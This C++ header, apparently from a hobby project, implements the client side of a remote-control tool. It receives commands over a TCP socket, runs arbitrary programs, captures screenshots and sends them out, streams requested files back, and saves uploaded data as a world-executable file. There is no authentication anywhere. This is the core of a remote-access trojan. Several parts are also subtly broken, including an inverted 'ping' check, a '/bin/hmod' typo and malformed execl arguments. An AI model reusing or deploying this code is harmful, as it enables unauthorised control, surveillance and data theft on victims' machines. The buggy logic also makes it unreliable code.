/* Copyright (C) 
 * 2016 - Lichao Zhang
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 */

#ifndef RECV_TCP_CMD_H_
#define RECV_TCP_CMD_H_

#include <iostream>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include "unistd.h"
#include "pthread.h"
#include "sys/types.h"
#include "sys/wait.h"
#include "fcntl.h"
/*
 * summary: send file to server via TCP2
 *
 * Param:
 *      path
 *
 * return: no return
 *
 * */
void *Send_File_To_Server(char* path);

int g_sockfd = 0;
std::string g_cmd = "";

void download(std::string path, int sockfd) {
	pid_t p1, p2, p3;
	int status;
	if ((p1 = fork()) == 0) {
		close(1);
		dup(sockfd);
		execl("/bin/echo", "/bin/echo", "7E457E45", NULL);
		exit(0);
	} else {
		wait(&status);
		if ((p2 = fork()) == 0) {
			close(1);
			dup(sockfd);
			execl("/bin/cat", "/bin/cat", path.c_str(), NULL);
			exit(0);
		} else {
			wait(&status);
			if ((p3 = fork()) == 0) {
				close(1);
				dup(sockfd);
				execl("/bin/echo", "/bin/echo", "7E257E25", NULL);
				exit(0);
			} else {
				wait(&status);
			}
		}
	}
}

void Open_Send(std::string path, int sockfd) {
	pid_t p, p1, p2, p3;
	int status;
	if ((p = fork()) == 0) {
		close(1);
		dup(sockfd);

		execl("/usr/bin/gnome-screenshot", "gnome-screenshot", "-f",
				path.c_str(), NULL);
		exit(0);
	} else {
		wait(&status);
//		FILE* fstream = fopen(path.c_str(), "r");
//		char ch;
//		char buff[128];
//		int len;
//		memset(buff, 0, 128);
//		buff[0] = '7';
//		buff[1] = 'E';
//		buff[2] = '4';
//		buff[3] = '5';
//		buff[4] = '7';
//		buff[5] = 'E';
//		buff[6] = '4';
//		buff[7] = '5';
//		buff[8] = '7';
//		buff[9] = 'E';
//		buff[10] = '4';
//		buff[11] = '5';
//		//start
//		write(sockfd, buff, 128);
		download(path, sockfd);
//		wait(&status);
//		//end
//		memset(buff, 0, 128);
//		buff[0] = '7';
//		buff[1] = 'E';
//		buff[2] = '2';
//		buff[3] = '5';
//		buff[4] = '7';
//		buff[5] = 'E';
//		buff[6] = '2';
//		buff[7] = '5';
//		buff[8] = '7';
//		buff[9] = 'E';
//		buff[10] = '2';
//		buff[11] = '5';
//		write(sockfd, buff, 128);
	}

}

void Recv_Cmd(int& sockfd) {
	char buff[128];
	int len;
	g_sockfd = sockfd;
	int f_fd = 0;
	std::string filename = "hello";
	int wstatus;

	while (1) {
		memset(buff, 0, 128);
		len = read(sockfd, buff, 128);
		std::string cmd_msg = std::string((char*) (buff));

		if (cmd_msg.find("ping")) {
			size_t first_blank = cmd_msg.find(' ');
			size_t second_blank = cmd_msg.find(' ', first_blank + 1);
			std::string s_fd = cmd_msg.substr(first_blank + 1,
					second_blank - first_blank);

			size_t third_blank = cmd_msg.find(' ', second_blank + 1);
			std::string dir = cmd_msg.substr(second_blank + 1,
					third_blank - second_blank - 1);
			size_t last_blank = cmd_msg.find_last_of(' ');
			std::string cmd = cmd_msg.substr(second_blank + 1,
					last_blank - second_blank);

			g_cmd = cmd;
			//TODO: EXEC cmd
			pid_t pc, pr;
			int status = 1;
			if ((pc = fork()) == 0) {
				//write result to temp file
				close(1);
				dup(sockfd);
				if (cmd.compare("ls") == 0 || cmd.compare("ls ") == 0) {
					execl("/bin/ls", "-a", "-l", (char *) 0);
				} else if (cmd.compare("ps") == 0 || cmd.compare("ps ") == 0) {
					char * const parmList[] = { "ps", NULL };
					execvp("/bin/ps", parmList);
				} else if (cmd.compare("top") == 0
						|| cmd.compare("top ") == 0) {
					char * const parmList[] = { "top", NULL };
					execl("/usr/bin/top", "/usr/bin/top -n 1", NULL);
				} else if (cmd.compare("gnome-screenshot") == 0
						|| cmd.compare("gnome-screenshot ") == 0) {
					Open_Send("test", sockfd);

				} else if (dir.compare("download") == 0) {
					size_t fourth_blank = cmd_msg.find(' ', third_blank + 1);
					std::string path_file = cmd_msg.substr(third_blank + 1,
							fourth_blank - third_blank - 1);

					download(path_file, sockfd);
				} else {
					execl(dir.c_str(), cmd.c_str(), NULL);
				}

				exit(0);
			} else {

				wait(&status);

			}
			//pr=waitpid(pc,NULL,WNOHANG);
		} else if (cmd_msg.find("7E457E45") != std::string::npos) { //!g_filefd[fd] && len == 4
			f_fd = open("./temp_123", O_WRONLY | O_CREAT | O_TRUNC,
					S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
//			char status = '1';
//			write(sockfd, &status, sizeof(char));
		} else if (cmd_msg.find("7E257E25") != std::string::npos) { //len == 2
			close(f_fd);
//			char status = '1';
//			write(sockfd, &status, sizeof(char));
			f_fd = 0;

			//TODO: chmod
			pid_t pp;
			if((pp = fork()) == 0){
				execl("/bin/hmod", "/bin/chmod", "777", "temp_123", NULL);
				exit(0);
			}
			wait(&wstatus);
		} else {
			write(f_fd, buff, len);
		}
	}
}

#endif /* RECV_TCP_CMD_H_ */
